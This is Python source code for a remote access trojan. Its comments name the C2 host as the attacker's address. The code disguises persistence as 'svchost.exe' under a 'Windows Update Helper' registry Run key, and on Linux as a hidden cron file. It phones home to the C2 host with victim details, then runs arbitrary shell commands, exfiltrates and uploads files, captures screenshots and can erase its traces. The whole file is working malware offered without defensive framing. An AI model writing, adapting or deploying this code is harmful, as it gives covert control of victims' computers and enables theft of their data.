import socket
import subprocess
import os
import sys
import json
import time
import platform
import shutil
import threading
from pathlib import Path

# Configuration
C2_HOST = '192.168.1.100'  # Attacker C2 IP
C2_PORT = 443
RECONNECT_INTERVAL = 10
MAX_FILE_CHUNK = 4096


class VictimServer:
    def __init__(self):
        self.sock = None
        self.platform = platform.system()
        self.session_id = os.urandom(4).hex()
        self.persist()

    def persist(self):
        """Install persistence mechanism"""
        try:
            if self.platform == 'Windows':
                key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
                reg_entry = 'Windows Update Helper'
                exe_path = os.path.join(os.getenv('APPDATA'), 'svchost.exe')
                if not os.path.exists(exe_path):
                    shutil.copyfile(sys.argv[0], exe_path)
                    subprocess.check_call(
                        f'reg add HKCU\\{key_path} /v {reg_entry} /t REG_SZ /d "{exe_path}"',
                        shell=True,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL
                    )
            elif self.platform == 'Linux':
                cron_entry = '@reboot /usr/bin/python3 ' + sys.argv[0]
                cron_path = '/etc/cron.d/.systemd'
                if not os.path.exists(cron_path):
                    with open(cron_path, 'w') as f:
                        f.write(cron_entry)
                    os.chmod(cron_path, 0o644)
        except Exception:
            pass

    def connect_c2(self):
        """Establish connection to C2 server"""
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((C2_HOST, C2_PORT))
                self.send_system_info()
                return True
            except Exception:
                time.sleep(RECONNECT_INTERVAL)

    def send_system_info(self):
        """Send victim profile to C2"""
        info = {
            'id': self.session_id,
            'os': self.platform,
            'hostname': platform.node(),
            'user': os.getenv('USERNAME') or os.getenv('USER')
        }
        self.sock.send(json.dumps(info).encode())

    def receive_commands(self):
        """Main command loop"""
        while True:
            try:
                cmd = self.sock.recv(MAX_FILE_CHUNK).decode().strip()
                if not cmd:
                    raise ConnectionError()

                # Process commands
                if cmd.startswith('download '):
                    self.send_file(cmd[9:])
                elif cmd.startswith('upload '):
                    self.receive_file(cmd[7:])
                elif cmd == 'screenshot':
                    self.take_screenshot()
                elif cmd == 'persist':
                    self.persist()
                elif cmd == 'kill':
                    self.self_destruct()
                else:
                    output = self.execute_command(cmd)
                    self.sock.send(output.encode())
            except Exception as e:
                self.connect_c2()

    def execute_command(self, cmd):
        """Execute system command"""
        try:
            result = subprocess.check_output(
                cmd,
                shell=True,
                stderr=subprocess.STDOUT,
                timeout=60
            )
            return result.decode(errors='ignore')
        except Exception as e:
            return str(e)

    def send_file(self, file_path):
        """Transfer file to attacker"""
        try:
            with open(file_path, 'rb') as f:
                while True:
                    chunk = f.read(MAX_FILE_CHUNK)
                    if not chunk:
                        break
                    self.sock.sendall(chunk)
            time.sleep(0.5)
            self.sock.send(b'<END>')
        except Exception as e:
            self.sock.send(f'File error: {str(e)}'.encode())

    def receive_file(self, file_path):
        """Receive file from attacker"""
        try:
            with open(file_path, 'wb') as f:
                while True:
                    chunk = self.sock.recv(MAX_FILE_CHUNK)
                    if chunk.endswith(b'<END>'):
                        f.write(chunk[:-5])
                        break
                    f.write(chunk)
            self.sock.send('File uploaded successfully'.encode())
        except Exception as e:
            self.sock.send(f'Upload failed: {str(e)}'.encode())

    def take_screenshot(self):
        """Capture screen (requires pyautogui)"""
        try:
            from pyautogui import screenshot
            screenshot('screen.png')
            self.send_file('screen.png')
            os.remove('screen.png')
        except ImportError:
            self.sock.send('Install pyautogui for screenshots'.encode())

    def self_destruct(self):
        """Remove persistence and exit"""
        try:
            if self.platform == 'Windows':
                subprocess.call(
                    'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Windows Update Helper" /f',
                    shell=True)
            elif self.platform == 'Linux':
                os.remove('/etc/cron.d/.systemd')
        finally:
            sys.exit(0)

    def start(self):
        """Main execution loop"""
        while True:
            if self.connect_c2():
                try:
                    self.receive_commands()
                except ConnectionResetError:
                    self.connect_c2()


if __name__ == '__main__':
    VictimServer().start()